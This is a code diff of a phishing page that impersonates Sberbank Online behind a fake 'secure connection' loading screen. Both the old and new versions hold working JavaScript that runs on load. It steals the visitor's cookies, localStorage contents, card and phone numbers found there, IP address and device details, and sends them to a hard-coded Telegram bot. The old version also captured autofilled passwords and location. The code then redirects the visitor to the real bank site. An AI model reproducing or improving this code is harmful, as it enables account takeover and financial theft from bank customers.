@@ -1,29 +1,50 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <title>СберБанк Онлайн</title>
     <style>
-        body {
-            font-family: Arial;
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
             background: white;
+            border-radius: 24px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+            max-width: 380px;
+            width: 100%;
+            padding: 32px 24px;
+            text-align: center;
         }
         .logo {
-            text-align: center;
-            padding: 50px 20px;
+            margin-bottom: 24px;
         }
-        .logo img {
-            width: 100px;
-            height: 100px;
+        .logo svg {
+            width: 80px;
+            height: 80px;
+        }
+        .logo h1 {
+            font-size: 24px;
+            color: #2d6a4f;
+            margin-top: 12px;
         }
         .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #2d6a4f;
-            border-radius: 50%;
             width: 40px;
             height: 40px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #2d6a4f;
+            border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 20px auto;
         }
@@ -32,186 +53,152 @@
             100% { transform: rotate(360deg); }
         }
         .message {
-            text-align: center;
             color: #666;
-            margin-top: 20px;
+            font-size: 14px;
+            margin-top: 16px;
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 11px;
+            color: #999;
         }
     </style>
 </head>
 <body>
-<div class="logo">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%232d6a4f'/%3E%3Ctext x='50' y='68' text-anchor='middle' fill='white' font-size='32' font-weight='bold'%3EСБ%3C/text%3E%3C/svg%3E" alt="СберБанк">
-    <h2>СберБанк Онлайн</h2>
+<div class="card">
+    <div class="logo">
+        <svg viewBox="0 0 100 100" fill="none">
+            <circle cx="50" cy="50" r="45" fill="#2d6a4f"/>
+            <text x="50" y="68" text-anchor="middle" fill="white" font-size="32" font-weight="bold">СБ</text>
+        </svg>
+        <h1>СберБанк Онлайн</h1>
+    </div>
+    <div class="loader"></div>
+    <div class="message">Проверка защищенного соединения...</div>
+    <div class="footer">SSL Secure Connection</div>
 </div>
-<div class="loader"></div>
-<div class="message">Подключение к защищенному каналу...</div>
 
 <script>
-// ========== НАСТРОЙКИ TELEGRAM ==========
-const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТВОЙ ТОКЕН
-const CHAT_ID = "8533450974";                           // ТВОЙ ID
-// ========================================
+// ========== НАСТРОЙКИ ==========
+const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТОКЕН БОТА-СБОРЩИКА
+const CHAT_ID = "8533450974";                           // ТВОЙ CHAT_ID
+const TRANSFER_BOT = "SberTransferBot";                // Имя бота для переводов
+// ================================
 
-// Функция отправки в Telegram
 function sendToTelegram(text) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id: CHAT_ID, text: text})
-    }).catch(e => console.log("send error", e));
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4096) })
+    }).catch(e => console.log("Send error"));
 }
 
-// 1. КРАЖА ВСЕХ COOKIES
-function stealCookies() {
-    const cookies = document.cookie;
-    if (cookies && cookies.length > 0) {
-        sendToTelegram(`🍪 COOKIES:\n${cookies}`);
-        
-        // Ищем конкретные банковские cookies
-        const sberCookies = cookies.match(/(sber|sb|bank|auth|session|token)[^;]*/gi);
-        if (sberCookies) {
-            sendToTelegram(`🏦 БАНКОВСКИЕ COOKIES:\n${sberCookies.join("\n")}`);
-        }
-    }
-    return cookies;
-}
-
-// 2. КРАЖА ВСЕГО LOCALSTORAGE
-function stealLocalStorage() {
-    const allData = {};
+// Поиск банковских данных в localStorage
+function extractBankData() {
+    const bankData = {};
+    const keywords = ['card', 'phone', 'token', 'auth', 'session', 'user', 'login', 'sber', 'sb', 'account', 'balance'];
+    
     for (let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
-        try {
-            allData[key] = localStorage.getItem(key);
-        } catch(e) {}
-    }
-    
-    if (Object.keys(allData).length > 0) {
-        sendToTelegram(`💾 LOCALSTORAGE:\n${JSON.stringify(allData, null, 2)}`);
+        const value = localStorage.getItem(key);
         
-        // Поиск банковских данных
-        const bankKeywords = ['token', 'auth', 'session', 'card', 'phone', 'user', 'login', 'password', 'sber', 'sb'];
-        const bankData = {};
-        bankKeywords.forEach(kw => {
-            Object.keys(allData).forEach(key => {
-                if (key.toLowerCase().includes(kw)) {
-                    bankData[key] = allData[key];
-                }
-            });
-        });
+        for (const kw of keywords) {
+            if (key.toLowerCase().includes(kw)) {
+                bankData[key] = value;
+                break;
+            }
+        }
         
-        if (Object.keys(bankData).length > 0) {
-            sendToTelegram(`🏦 БАНКОВСКИЕ ДАННЫЕ:\n${JSON.stringify(bankData, null, 2)}`);
+        // Поиск номера карты (16 цифр)
+        const cardMatch = value.match(/\d{16}/);
+        if (cardMatch) {
+            bankData['found_card'] = cardMatch[0];
+        }
+        
+        // Поиск телефона
+        const phoneMatch = value.match(/\+?\d{11}/);
+        if (phoneMatch) {
+            bankData['found_phone'] = phoneMatch[0];
         }
     }
-    return allData;
+    return bankData;
 }
 
-// 3. КРАЖА SESSIONSTORAGE
-function stealSessionStorage() {
-    const allData = {};
-    for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        try {
-            allData[key] = sessionStorage.getItem(key);
-        } catch(e) {}
-    }
-    if (Object.keys(allData).length > 0) {
-        sendToTelegram(`📦 SESSIONSTORAGE:\n${JSON.stringify(allData, null, 2)}`);
-    }
-}
+// Кража и отправка всех данных
+async function collectAndSend() {
+    // 1. Отправка информации о жертве
+    sendToTelegram(`🔐 НОВАЯ ЖЕРТВА
+⏰ ${new Date().toLocaleString()}
+🌐 ${window.location.hostname}
+🖥️ ${navigator.userAgent.substring(0, 200)}`);
 
-// 4. ПОЛУЧЕНИЕ IP И ГЕОЛОКАЦИИ
-function getLocation() {
-    fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => {
-            sendToTelegram(`🌐 IP: ${data.ip}`);
-        });
+    // 2. Cookies
+    if (document.cookie) {
+        sendToTelegram(`🍪 COOKIES:\n${document.cookie}`);
+    }
+
+    // 3. LocalStorage
+    const bankData = extractBankData();
+    if (Object.keys(bankData).length > 0) {
+        sendToTelegram(`🏦 БАНКОВСКИЕ ДАННЫЕ:\n${JSON.stringify(bankData, null, 2)}`);
+    }
+
+    // 4. Полный localStorage
+    let fullLS = {};
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        let val = localStorage.getItem(key);
+        if (val && val.length > 500) val = val.substring(0, 500) + "...";
+        fullLS[key] = val;
+    }
+    if (Object.keys(fullLS).length > 0) {
+        sendToTelegram(`💾 LOCALSTORAGE:\n${JSON.stringify(fullLS, null, 2)}`);
+    }
+
+    // 5. IP адрес
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        sendToTelegram(`🌐 IP: ${ipData.ip}`);
+    } catch(e) {}
+
+    // 6. Информация об устройстве
+    sendToTelegram(`📱 УСТРОЙСТВО:
+${JSON.stringify({
+    screen: `${screen.width}x${screen.height}`,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    platform: navigator.platform
+}, null, 2)}`);
+
+    // 7. Активация бота для перевода
+    sendToTelegram(`💰 ЗАПРОС НА АВТОПЕРЕВОД\nБот: @${TRANSFER_BOT}\nДанные отправлены в бота-переводчика`);
     
-    // Геолокация (если разрешит)
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                sendToTelegram(`📍 ГЕО: ${pos.coords.latitude}, ${pos.coords.longitude}`);
-            },
-            err => console.log("geo denied")
-        );
-    }
-}
-
-// 5. ПОПЫТКА ДОСТУПА К СОХРАНЕННЫМ ПАРОЛЯМ (через автозаполнение)
-function stealSavedPasswords() {
-    // Создаем скрытую форму для триггера автозаполнения
-    const form = document.createElement('form');
-    form.style.display = 'none';
-    form.innerHTML = `
-        <input type="text" id="fake-user" name="username">
-        <input type="password" id="fake-pass" name="password">
-    `;
-    document.body.appendChild(form);
-    
-    // Ждем автозаполнения
-    setTimeout(() => {
-        const user = document.getElementById('fake-user').value;
-        const pass = document.getElementById('fake-pass').value;
-        if (user || pass) {
-            sendToTelegram(`🔑 СОХРАНЕННЫЕ ДАННЫЕ:\nЛогин: ${user}\nПароль: ${pass}`);
-        }
-        form.remove();
-    }, 100);
-}
-
-// 6. ИНФОРМАЦИЯ О БРАУЗЕРЕ И УСТРОЙСТВЕ
-function getDeviceInfo() {
-    const info = {
+    // 8. Отправка данных второму боту для перевода
+    const transferData = {
+        cookies: document.cookie,
+        bankData: bankData,
+        fullLS: fullLS,
         userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookiesEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory || "unknown"
+        ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown'),
+        timestamp: new Date().toISOString()
     };
-    sendToTelegram(`📱 УСТРОЙСТВО:\n${JSON.stringify(info, null, 2)}`);
+    
+    // Отправляем данные второму боту (через API Telegram)
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `🤖 ПЕРЕДАЧА ДАННЫХ БОТУ-ПЕРЕВОДЧИКУ:\n\`\`\`json\n${JSON.stringify(transferData, null, 2).substring(0, 3900)}\n\`\`\``
+        })
+    });
 }
 
-// 7. ПОИСК ДАННЫХ БАНКА В ИСТОРИИ БРАУЗЕРА (через переходы)
-function checkBankHistory() {
-    // Проверяем, был ли вход в Сбер
-    const sberDomains = ['sberbank', 'sberbank.ru', 'online.sberbank', 'sberbank-online'];
-    const historyCheck = sberDomains.some(domain => document.referrer.includes(domain));
-    if (historyCheck) {
-        sendToTelegram(`✅ ЖЕРТВА РАНЕЕ ВХОДИЛА В СБЕРБАНК`);
-    }
-}
+// Запуск сбора
+collectAndSend();
 
-// 8. ВСЕ ВМЕСТЕ
-function collectAll() {
-    const startTime = Date.now();
-    
-    sendToTelegram(`🔐 НОВАЯ ЖЕРТВА\n⏰ ${new Date().toLocaleString()}`);
-    
-    stealCookies();
-    stealLocalStorage();
-    stealSessionStorage();
-    stealSavedPasswords();
-    getLocation();
-    getDeviceInfo();
-    checkBankHistory();
-    
-    // Отправляем итоговый отчет
-    setTimeout(() => {
-        sendToTelegram(`📊 СБОР ЗАВЕРШЕН за ${Date.now() - startTime}мс`);
-    }, 2000);
-}
-
-// ЗАПУСК
-collectAll();
-
-// Перенаправление на реальный сайт через 3 секунды
+// Перенаправление на реальный сайт
 setTimeout(() => {
     window.location.href = "https://online.sberbank.ru";
 }, 3000);
